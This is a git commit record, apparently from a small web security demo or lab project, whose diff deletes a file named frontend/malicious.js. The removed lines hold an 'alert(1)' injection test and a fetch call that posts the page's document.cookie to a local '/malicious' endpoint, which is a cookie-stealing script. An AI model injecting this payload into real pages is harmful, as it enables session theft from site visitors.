824b2126953bf10a9e709aa43c12f0dfb820494c
Sandon Li <sandonli@outlook.com>
2023-11-20 23:32:08 -0800

    push 3

--- frontend/malicious.js
+++
@@ -1,4 +0,0 @@
-
-alert(1)
-
-fetch('http://localhost:3000/malicious', {method: 'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({'cookie': document.cookie})}).then(response=>response.json()).then(data=>{console.log(data)})
